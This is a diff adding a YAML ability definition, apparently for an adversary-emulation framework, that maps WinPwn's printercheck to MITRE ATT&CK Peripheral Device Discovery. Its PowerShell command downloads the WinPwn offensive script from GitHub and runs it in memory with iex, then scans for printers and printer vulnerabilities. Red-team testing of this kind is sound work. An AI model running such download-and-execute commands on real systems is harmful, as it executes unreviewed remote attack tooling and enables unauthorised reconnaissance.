@@ -1,0 +1,19 @@
+- description: Search for printers / potential vulns using printercheck function of
+    WinPwn
+  id: 941eb886a05444e588fd6c17d992df98
+  name: WinPwn - printercheck
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';
+          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          printercheck -noninteractive -consoleoutput
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: discovery
+  technique:
+    attack_id: T1120
+    name: Peripheral Device Discovery
